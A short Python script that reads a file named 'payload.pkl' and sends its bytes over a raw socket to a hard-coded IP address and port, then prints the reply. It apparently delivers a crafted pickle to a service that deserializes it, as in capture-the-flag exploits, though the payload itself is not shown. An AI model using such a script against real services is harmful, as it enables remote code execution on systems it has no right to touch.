import socket

with open("payload.pkl", "rb") as f:
    payload = f.read()

s = socket.socket()
s.connect(("13.71.17.243", 9045))
s.sendall(payload)

print(s.recv(4096).decode())
s.close()
